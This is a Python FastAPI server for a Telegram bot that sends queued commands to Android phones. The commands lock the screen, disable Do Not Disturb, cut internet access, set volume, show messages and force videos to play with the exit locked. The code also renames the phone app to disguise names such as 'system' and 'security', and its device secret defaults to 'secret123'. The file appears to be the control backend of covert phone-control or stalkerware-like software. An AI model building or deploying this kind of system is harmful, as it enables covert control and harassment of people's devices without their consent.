from fastapi import FastAPI, Header, HTTPException
from typing import Optional
import os
import asyncio
import httpx
from datetime import datetime
import uuid

app = FastAPI()

# ─── Глобальное состояние ────────────────────────────────────────────────────

# devices: { device_id -> { "model": str, "last_seen": datetime, "active": bool,
#                           "pending_commands": list, "command_callbacks": dict } }
devices: dict = {}

state = {
    "raw_links": [],
    "video_sessions": {},   # chat_id -> session
    "selected_device": {},  # chat_id -> device_id
}

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "")
DEVICE_SECRET = os.environ.get("DEVICE_SECRET", "secret123")
SELF_URL = os.environ.get("SELF_URL", "")

VALID_NAMES = ["android", "security", "безопасность", "звонки", "system", "phonecontrol"]


# ─── Keep-alive ──────────────────────────────────────────────────────────────

async def keep_alive():
    await asyncio.sleep(60)
    while True:
        try:
            if SELF_URL:
                async with httpx.AsyncClient(timeout=10) as client:
                    await client.get(f"{SELF_URL}/health")
        except Exception as e:
            print(f"keep_alive error: {e}")
        await asyncio.sleep(270)


@app.on_event("startup")
async def startup():
    asyncio.create_task(keep_alive())


# ─── Telegram helpers ─────────────────────────────────────────────────────────

async def send_tg(chat_id: str, text: str, reply_markup=None):
    if not BOT_TOKEN:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            await client.post(url, json=payload)
    except Exception as e:
        print(f"send_tg error: {e}")


async def answer_callback(callback_query_id: str, text: str = ""):
    if not BOT_TOKEN:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            await client.post(url, json={"callback_query_id": callback_query_id, "text": text})
    except Exception as e:
        print(f"answer_callback error: {e}")


# ─── Device helpers ───────────────────────────────────────────────────────────

def get_device(device_id: str) -> dict:
    """Вернуть запись устройства (создать, если нет)."""
    if device_id not in devices:
        devices[device_id] = {
            "model": "Unknown",
            "last_seen": None,
            "active": False,
            "pending_commands": [],
            "command_callbacks": {},
        }
    return devices[device_id]


def device_online(device_id: str) -> bool:
    d = devices.get(device_id)
    if not d or not d["last_seen"]:
        return False
    return (datetime.now() - d["last_seen"]).total_seconds() < 120


def device_last_seen_str(device_id: str) -> str:
    d = devices.get(device_id)
    if not d or not d["last_seen"]:
        return "никогда"
    delta = int((datetime.now() - d["last_seen"]).total_seconds())
    if delta < 60:
        return f"{delta} сек назад"
    return f"{delta // 60} мин назад"


def selected_device_id(chat_id: str) -> Optional[str]:
    """Выбранное устройство для чата; None если не выбрано."""
    return state["selected_device"].get(chat_id)


def require_device(chat_id: str):
    """
    Вернуть (device_id, None) если устройство выбрано и активно.
    Вернуть (None, error_text) иначе.
    """
    if not devices:
        return None, "⚠️ Нет подключённых устройств. Дождись первого поллинга."
    dev_id = selected_device_id(chat_id)
    if not dev_id or dev_id not in devices:
        if len(devices) == 1:
            # Единственное устройство — выбираем автоматически
            dev_id = next(iter(devices))
            state["selected_device"][chat_id] = dev_id
        else:
            return None, "⚠️ Выбери устройство командой /devices"
    if not devices[dev_id]["active"]:
        return None, "⚠️ Сначала включи режим командой /on"
    return dev_id, None


# ─── Command queue ────────────────────────────────────────────────────────────

async def enqueue_command(chat_id: str, dev_id: str, cmd: dict, description: str):
    d = devices[dev_id]
    if not device_online(dev_id):
        await send_tg(chat_id,
            f"⚠️ Телефон оффлайн (последний ping: {device_last_seen_str(dev_id)})\nКоманда добавлена в очередь.")
    else:
        await send_tg(chat_id, "📡 Отправляю команду...")

    cmd_id = str(uuid.uuid4())[:8]
    cmd["_id"] = cmd_id
    d["pending_commands"].append(cmd)
    d["command_callbacks"][cmd_id] = chat_id
    await send_tg(chat_id, f"✅ Команда `{description}` в очереди (ID: `{cmd_id}`)")


# ─── Video helpers ────────────────────────────────────────────────────────────

def normalize_google_drive_url(url: str) -> str:
    if "drive.google.com/file/d/" in url:
        try:
            file_id = url.split("/file/d/")[1].split("/")[0]
            return f"https://drive.google.com/uc?export=download&confirm=t&id={file_id}"
        except Exception:
            pass
    return url


def video_lock_keyboard():
    return {
        "inline_keyboard": [[
            {"text": "🔓 Без блокировки", "callback_data": "vlock_no"},
            {"text": "🔒 Заблокировать выход", "callback_data": "vlock_yes"},
        ]]
    }


async def start_video_flow(chat_id: str, video_cmd: str, video_num: int = 0, video_url: str = ""):
    state["video_sessions"][chat_id] = {
        "step": "lock",
        "video_cmd": video_cmd,
        "video_num": video_num,
        "video_url": video_url,
        "lock": False,
        "duration": 0,
    }
    name = f"video{video_num}" if video_num else "raw видео"
    await send_tg(
        chat_id,
        f"🎬 *{name}*\n\nЗаблокировать выход из видео?\n_(кнопка HOME будет снова открывать видео)_",
        reply_markup=video_lock_keyboard()
    )


# ─── /devices keyboard ────────────────────────────────────────────────────────

def devices_keyboard():
    rows = []
    for dev_id, d in devices.items():
        status = "🟢" if device_online(dev_id) else "🔴"
        label = f"{status} {d['model']} ({dev_id[:6]})"
        rows.append([{"text": label, "callback_data": f"sel_{dev_id}"}])
    return {"inline_keyboard": rows}


# ─── Callback processing ──────────────────────────────────────────────────────

async def process_callback(callback: dict):
    chat_id = str(callback["message"]["chat"]["id"])
    data = callback.get("data", "")
    cb_id = callback["id"]

    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        await answer_callback(cb_id, "⛔ Нет доступа")
        return

    # Выбор устройства
    if data.startswith("sel_"):
        dev_id = data[4:]
        if dev_id not in devices:
            await answer_callback(cb_id, "⚠️ Устройство не найдено")
            return
        state["selected_device"][chat_id] = dev_id
        d = devices[dev_id]
        online = "🟢 онлайн" if device_online(dev_id) else f"🔴 оффлайн (ping: {device_last_seen_str(dev_id)})"
        await answer_callback(cb_id, f"✅ Выбрано: {d['model']}")
        await send_tg(chat_id,
            f"📱 Выбрано устройство: *{d['model']}*\nID: `{dev_id}`\nСтатус: {online}")
        return

    # Видео-сессия
    session = state["video_sessions"].get(chat_id)
    if not session:
        await answer_callback(cb_id, "Сессия устарела, начни заново")
        return

    if data == "vlock_no":
        await answer_callback(cb_id, "🔓 Без блокировки")
        session["lock"] = False
        session["step"] = "duration"
        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = без ограничения, крестик через 3 сек)_")

    elif data == "vlock_yes":
        await answer_callback(cb_id, "🔒 Блокировка включена")
        session["lock"] = True
        session["step"] = "duration"
        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = бесконечно, выйти только через /unbanvideo)_")


# ─── Message processing ───────────────────────────────────────────────────────

async def process_update(update: dict):
    if "callback_query" in update:
        await process_callback(update["callback_query"])
        return

    msg = update.get("message") or update.get("edited_message")
    if not msg:
        return

    chat_id = str(msg["chat"]["id"])
    text = msg.get("text", "").strip()

    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        await send_tg(chat_id, "⛔ Нет доступа.")
        return

    # Видео-сессия: ждём число секунд
    session = state["video_sessions"].get(chat_id)
    if session and session["step"] == "duration":
        if not text.isdigit():
            await send_tg(chat_id, "⚠️ Введи число секунд (например: 30) или 0")
            return
        duration = int(text)
        session["duration"] = duration
        session["step"] = "done"
        state["video_sessions"].pop(chat_id, None)

        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return

        lock_str = "🔒 заблокирован" if session["lock"] else "🔓 без блокировки"
        dur_str = f"{duration} сек" if duration > 0 else ("бесконечно" if session["lock"] else "без ограничения")
        await send_tg(chat_id, f"✅ Запускаю видео\nВыход: {lock_str}\nОбязательное время: {dur_str}")

        cmd = {"cmd": session["video_cmd"], "lock": session["lock"], "duration": duration}
        if session["video_cmd"] == "video":
            cmd["num"] = session["video_num"]
            desc = f"video{session['video_num']}"
        else:
            cmd["url"] = session["video_url"]
            desc = "raw видео"

        await enqueue_command(chat_id, dev_id, cmd, desc)
        return

    # ── Команды ──────────────────────────────────────────────────────────────

    if text in ("/start", "/help"):
        cur = selected_device_id(chat_id)
        cur_str = ""
        if cur and cur in devices:
            cur_str = f"\nТекущее устройство: *{devices[cur]['model']}* (`{cur[:6]}`)"
        await send_tg(chat_id, (
            "📱 *Phone Control Bot*\n\n"
            "*Устройства:*\n"
            "/devices — список и выбор устройства\n"
            f"{cur_str}\n\n"
            "*Управление:*\n"
            "/on — включить режим управления\n"
            "/off — выключить режим управления\n"
            "/status — статус\n\n"
            "*Команды:*\n"
            "/shutdown — заблокировать экран\n"
            "/dnd — отключить «Не беспокоить»\n"
            "/ban — заблокировать интернет на 5 мин\n"
            "/unban — разблокировать интернет\n"
            "/msg <текст> — показать сообщение\n"
            "/sound <0-10> — установить громкость\n\n"
            "*Видео:*\n"
            "/video1, /video2, /video3 — встроенные видео\n"
            "/addraw <url> — добавить ссылку (скачается сразу)\n"
            "/lists — список сохранённых ссылок\n"
            "/raw <номер> — воспроизвести по номеру\n"
            "/delvideo <номер> — удалить ссылку и кэш\n"
            "/unbanvideo — разблокировать выход из видео\n\n"
            "*Прочее:*\n"
            "/name <имя> — переименовать приложение\n"
            f"Доступные имена: {', '.join(VALID_NAMES)}"
        ))

    elif text == "/devices":
        if not devices:
            await send_tg(chat_id, "📵 Нет подключённых устройств.\nДождись поллинга от телефона.")
            return
        cur = selected_device_id(chat_id)
        cur_str = ""
        if cur and cur in devices:
            cur_str = f"Сейчас выбрано: *{devices[cur]['model']}* (`{cur[:6]}`)\n\n"
        await send_tg(
            chat_id,
            f"📱 *Выбери устройство:*\n{cur_str}Подключённых: {len(devices)}",
            reply_markup=devices_keyboard()
        )

    elif text == "/on":
        dev_id = selected_device_id(chat_id)
        if not devices:
            await send_tg(chat_id, "⚠️ Нет подключённых устройств.")
            return
        if not dev_id or dev_id not in devices:
            if len(devices) == 1:
                dev_id = next(iter(devices))
                state["selected_device"][chat_id] = dev_id
            else:
                await send_tg(chat_id, "⚠️ Выбери устройство командой /devices")
                return
        devices[dev_id]["active"] = True
        devices[dev_id]["pending_commands"] = []
        online = "🟢 онлайн" if device_online(dev_id) else f"🔴 оффлайн (ping: {device_last_seen_str(dev_id)})"
        await send_tg(chat_id,
            f"✅ Режим управления *включён*\n"
            f"Устройство: *{devices[dev_id]['model']}*\nТелефон: {online}")

    elif text == "/off":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        devices[dev_id]["active"] = False
        devices[dev_id]["pending_commands"] = []
        await send_tg(chat_id, f"🔕 Режим управления *выключен* для *{devices[dev_id]['model']}*.")

    elif text == "/status":
        if not devices:
            await send_tg(chat_id, "📵 Нет подключённых устройств.")
            return
        lines = ["📊 *Статус устройств*\n"]
        cur = selected_device_id(chat_id)
        for dev_id, d in devices.items():
            marker = "👉 " if dev_id == cur else "    "
            online = "🟢" if device_online(dev_id) else "🔴"
            mode = "активен" if d["active"] else "спит"
            lines.append(
                f"{marker}{online} *{d['model']}* (`{dev_id[:6]}`)\n"
                f"      ping: {device_last_seen_str(dev_id)} | режим: {mode} | очередь: {len(d['pending_commands'])}"
            )
        if not cur:
            lines.append("\n_Устройство не выбрано. /devices_")
        await send_tg(chat_id, "\n".join(lines))

    elif text == "/shutdown":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_command(chat_id, dev_id, {"cmd": "shutdown"}, "блокировка экрана")

    elif text == "/dnd":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_command(chat_id, dev_id, {"cmd": "dnd_off"}, "отключить DnD")

    elif text == "/ban":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_command(chat_id, dev_id, {"cmd": "ban"}, "блокировка интернета")

    elif text == "/unban":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_command(chat_id, dev_id, {"cmd": "unban"}, "разблокировка интернета")

    elif text.startswith("/msg "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            message = text[5:].strip()
            if not message:
                await send_tg(chat_id, "⚠️ Укажи текст: /msg Привет")
                return
            await enqueue_command(chat_id, dev_id, {"cmd": "show_message", "text": message}, "показать сообщение")

    elif text in ("/video1", "/video2", "/video3"):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            num = int(text[-1])
            await start_video_flow(chat_id, "video", video_num=num)

    elif text.startswith("/sound"):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            parts = text.split()
            if len(parts) != 2 or not parts[1].isdigit() or not (0 <= int(parts[1]) <= 10):
                await send_tg(chat_id, "⚠️ Укажи уровень от 0 до 10: /sound 7")
                return
            level = int(parts[1])
            await enqueue_command(chat_id, dev_id, {"cmd": "sound", "level": level}, f"громкость {level}/10")

    elif text.startswith("/addraw "):
        url = text[8:].strip()
        if not url.startswith("http"):
            await send_tg(chat_id, "⚠️ Некорректная ссылка.")
            return
        url = normalize_google_drive_url(url)
        entry = {"id": str(uuid.uuid4())[:6], "url": url, "added": datetime.now().strftime("%d.%m %H:%M")}
        state["raw_links"].append(entry)
        num = len(state["raw_links"])
        preview = url[:60] + "..." if len(url) > 60 else url
        await send_tg(chat_id, f"✅ Ссылка добавлена под номером *{num}*\nURL: `{preview}`")

        dev_id = selected_device_id(chat_id)
        if dev_id and dev_id in devices and devices[dev_id]["active"]:
            cmd_id = str(uuid.uuid4())[:8]
            devices[dev_id]["pending_commands"].append({"cmd": "prefetch", "url": url, "_id": cmd_id})
            devices[dev_id]["command_callbacks"][cmd_id] = chat_id
            await send_tg(chat_id, "📥 Видео отправлено на фоновое скачивание.")
        else:
            await send_tg(chat_id, "⚠️ Телефон оффлайн — скачается при следующем подключении.")

    elif text == "/lists":
        if not state["raw_links"]:
            await send_tg(chat_id, "📭 Список пуст. Добавь через /addraw <url>")
            return
        lines = ["📋 *Список видео по ссылкам:*\n"]
        for i, entry in enumerate(state["raw_links"], 1):
            preview = entry["url"][:50] + "..." if len(entry["url"]) > 50 else entry["url"]
            lines.append(f"{i}. `{preview}`\n   Добавлено: {entry['added']}")
        lines.append("\nВоспроизвести: /raw <номер>\nУдалить: /delvideo <номер>")
        await send_tg(chat_id, "\n".join(lines))

    elif text.startswith("/raw "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ Укажи номер: /raw 1")
            return
        num = int(parts[1])
        if num < 1 or num > len(state["raw_links"]):
            await send_tg(chat_id, f"⚠️ Нет ссылки с номером {num}.")
            return
        entry = state["raw_links"][num - 1]
        await start_video_flow(chat_id, "play_raw", video_url=entry["url"])

    elif text.startswith("/delvideo "):
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ Укажи номер: /delvideo 1")
            return
        num = int(parts[1])
        if num < 1 or num > len(state["raw_links"]):
            await send_tg(chat_id, f"⚠️ Нет ссылки с номером {num}.")
            return
        entry = state["raw_links"].pop(num - 1)
        dev_id = selected_device_id(chat_id)
        if dev_id and dev_id in devices and devices[dev_id]["active"]:
            await enqueue_command(chat_id, dev_id,
                {"cmd": "delete_video", "url": entry["url"]}, f"удалить кэш видео {num}")
        await send_tg(chat_id, f"🗑 Ссылка {num} удалена.")

    elif text == "/unbanvideo":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_command(chat_id, dev_id, {"cmd": "unban_video"}, "разблокировать выход из видео")

    elif text.startswith("/name "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            name = text[6:].strip().lower()
            if name not in VALID_NAMES:
                await send_tg(chat_id, f"⚠️ Доступные имена: {', '.join(VALID_NAMES)}")
                return
            await enqueue_command(chat_id, dev_id, {"cmd": "rename", "name": name}, f"переименовать в {name}")

    else:
        await send_tg(chat_id, "❓ Неизвестная команда. Напиши /help")


# ─── Webhook ──────────────────────────────────────────────────────────────────

@app.post("/webhook")
async def webhook(update: dict):
    asyncio.create_task(process_update(update))
    return {"ok": True}


# ─── Poll endpoint (Android) ──────────────────────────────────────────────────

@app.get("/poll")
async def poll(
    x_device_secret: Optional[str] = Header(None),
    x_device_id: Optional[str] = Header(None),
    x_device_model: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    # Регистрируем / обновляем устройство
    dev_id = x_device_id or "default"
    d = get_device(dev_id)
    d["last_seen"] = datetime.now()
    if x_device_model:
        d["model"] = x_device_model

    # Уведомить бота при первом появлении нового устройства
    if ALLOWED_CHAT_ID and d["last_seen"] is not None:
        if len(devices) == 1 and d["last_seen"] == datetime.now():
            pass  # первый poll уже обработан get_device

    # Отдать первую команду из очереди этого устройства
    if d["pending_commands"]:
        cmd = d["pending_commands"].pop(0)
        cmd_id = cmd.get("_id")
        if cmd_id and cmd_id in d["command_callbacks"]:
            chat_id = d["command_callbacks"].pop(cmd_id)
            asyncio.create_task(
                send_tg(chat_id, f"📲 Телефон получил команду `{cmd.get('cmd')}` и выполняет.")
            )
        return {"active": d["active"], "command": cmd}

    return {"active": d["active"], "command": None}


# ─── Health ───────────────────────────────────────────────────────────────────

@app.get("/health")
async def health():
    return {"status": "ok", "devices": len(devices)}
